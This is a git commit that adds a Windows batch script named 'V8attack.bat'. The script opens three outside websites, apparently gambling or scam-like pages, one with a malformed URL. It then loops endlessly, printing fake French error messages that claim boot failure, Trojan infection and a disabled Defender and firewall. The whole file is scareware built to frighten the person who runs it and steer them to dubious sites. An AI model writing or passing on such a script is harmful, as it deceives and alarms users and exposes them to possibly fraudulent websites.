45e91848a379aa8794c0b99b50edb73877527f29
dassored <101705817+dassored@users.noreply.github.com>
2023-03-20 18:01:34 +0100

    Add files via upload

---
+++ V8attack.bat
@@ -0,0 +1,25 @@
+@echo off
+
+start https://www.pramuwaskito.org/games/
+start https://iconfit88.com/
+start https://https://afriqjmarbitrage.us/
+:Start
+echo "Erreur fatale 1068 : impossible de charger le système d'exploitation",
+    "Erreur fatale 0x0000007B : inaccessible_Windose boot_device : ",
+    "Erreur 53 windose Defender et firewall desativer"
+    "Erreur système 0x0000007B infections de type Trojan ",
+    "Erreur sytheme 0xC000021A : STATUS_SYSTEM_PROCESS_TERMINATED"
+    "Erreur sytheme 0x000000D1 : DRIVER_IRQL_NOT_LESS_OR_EQUAL"
+    "Erreur sytheme 0xC000000F : STATUS_NO_SUCH_DEVICE"
+    "Erreur 0xC0000221 : STATUS_IMAGE_CHECKSUM_MISMATCH"
+    "Erreur 0xC0000023 : STATUS_ACCESS_DENIED"
+    "Erreur 0x0x80070002 : Alerte système "
+    "Erreur 0x8007007E : du chargement windose 11 : "
+    "Erreur 0x80070070 :code d’erreur Win32  "
+    "Erreur système 0xC000021A Erreur fatal windose"
+    "Erreur 0x80070005 : Accès refusé."   !
+
+
+
+
+Goto Start
